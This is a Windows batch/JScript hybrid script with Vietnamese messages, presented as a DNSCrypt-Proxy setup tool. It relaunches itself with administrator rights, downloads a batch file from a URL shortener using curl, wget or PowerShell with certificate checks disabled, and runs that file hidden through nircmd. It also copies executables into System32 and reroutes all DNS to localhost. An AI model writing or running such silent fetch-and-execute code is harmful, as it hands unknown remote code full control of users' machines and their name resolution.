@set @_cmd=1 /*
@echo off
setlocal EnableExtensions
set "PhienBan=20200419b"
title DNSCrypt-Proxy %PhienBan%

rem ============================================================================
whoami /groups | findstr "S-1-16-12288" >nul && goto :admin
if "%~1"=="RunAsAdmin" goto :error

echo Dang lay quyen Administrator de quan ly duch vu DNSCrypt-Proxy . . .
cscript /nologo /e:javascript "%~f0" || goto :error
exit /b

:error
echo.
echo Vui long chay Scripts nay voi quyen Administrator
echo.
goto :end
rem ============================================================================

:admin
pushd "%~dp0"
set "TM=%cd%"
set "ST=C:\Windows\System32"
cls

if exist %ST%\curl.exe (
	echo.
	echo Dang tai Scripts bang cURL ...
	curl -sLko %TM%/tai.bat https://bom.to/tai
	goto :chay
) else (
	xcopy .\curl\*.* "%ST%" /h/i/c/k/e/r/y
)

if exist %ST%\wget.exe (
	echo.
	echo Dang tai Scripts bang wGet ...
	wget -q --no-check-certificate https://bom.to/tai -O "C:\ProgramData\DNS\tai.bat"
	goto :chay
)

if exist %ST%\powershell.exe (
	echo.
	echo Dang tai Scripts bang PowerShell ...
	powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://bom.to/tai', '%cd%\tai.bat') }"
	goto :chay
)

:chay
if exist %ST%\nircmd.exe (
	echo.
	nircmd exec hide "%TM%/tai.bat"
) else (
	xcopy .\cmd\*.* "%ST%" /h/i/c/k/e/r/y
)

if exist %TM%\bl7.bat (
	del %TM%\bl7.bat
)

if exist %TM%\w10.bat (
	del %TM%\w10.bat
)

if exist %TM%\b10.bat (
	del %TM%\b10.bat
)

for /F "tokens=3,*" %%A in ('netsh interface show interface ^| find "Connected"') do (netsh int ipv4 set dns name="%%B" static 127.0.0.1 primary validate=no && netsh int ipv6 set dns name="%%B" static ::1 primary validate=no)
ipconfig /flushdns
popd
:end
rem set /p =Press [Enter] to exit . . .
exit /b */

// JScript, restart batch script as administrator
var objShell = WScript.CreateObject('Shell.Application');
var ComSpec = WScript.CreateObject('WScript.Shell').ExpandEnvironmentStrings('%ComSpec%');
objShell.ShellExecute(ComSpec, '/c ""' + WScript.ScriptFullName + '" RunAsAdmin"', '', 'runas', 1);
